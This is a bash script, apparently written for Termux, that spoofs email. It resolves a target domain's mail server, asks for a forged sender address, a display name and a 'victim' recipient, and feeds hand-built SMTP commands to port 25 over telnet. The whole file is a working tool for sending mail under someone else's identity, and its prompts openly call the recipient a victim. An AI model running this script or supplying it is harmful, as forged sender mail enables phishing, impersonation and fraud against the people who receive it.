#!/data/data/com.termux/files/usr/bin/bash
echo 
echo 
# First let's get some information
echo Please enter target domain:
read target
echo
# Use nslookup to find the first mailserver for the specified domain
SERVER=$(nslookup -query=mx $target | grep -m 1 exchanger | cut -f5 -d  " ")

echo Please input \"from\" mailadress
read from
echo
echo please input victim mailadress
read to
echo
# The friendly name is the name which takes priority over the "from" email address
echo please input a \"friendly name\"
read from2
echo
echo please write a subject
read subject
echo
# Now let's start nano, we use nano to have support for multiple lines in the email.
echo now write your email please
# echo filename = tempmail2, please dont change
echo nano will start in 3
sleep 3
nano tempmail2
# Verify input 
echo
echo Target server $SERVER
echo
echo from $from will sent a email to $to
echo subject is $Subject
echo 
cat tempmail2
echo
echo is this data correct?
# Give user chance to cancel
options=("yes start mailing" "no (will close program)")
select opt in "${options[@]}"
do
    case $opt in
        "yes start mailing")
            # First construct the header of the email
            echo helo $target >tempmail
            echo mail from: $from >>tempmail
            echo rcpt to: $to >>tempmail
            echo data >>tempmail
			echo Subject: $subject >>tempmail
 			echo To: $to >>tempmail
 			echo From: $from2 \<$from\> >>tempmail
            # Done, proceed to mail content
            cat tempmail >finalmail
            echo >>finalmail
            cat tempmail2 >>finalmail
            # Construct shell script to feed smtp commands into telnet
            echo cat finalmail \| while read line >tempmailscript.sh
            echo do >>tempmailscript.sh
            echo echo \"\$line\" >>tempmailscript.sh
            echo sleep 1 >>tempmailscript.sh
            echo done >>tempmailscript.sh
            echo >>finalmail
            echo . >>finalmail
            echo >>finalmail
            # Make script executable
            chmod +x tempmailscript.sh
            # Feed output from the mail script into telnet on port 25 of target domain.
            ./tempmailscript.sh | telnet $SERVER 25
            echo 
            # Cleanup phase
            rm tempmailscript.sh
            rm tempmail
            rm tempmail2
            rm finalmail
            exit
            ;;
        "no (will close program)")
			echo exiting program
			sleep 2		
			exit 0
            ;;
        *) echo invalid option;;
    esac
done

# TODO: Add option to change content before sending.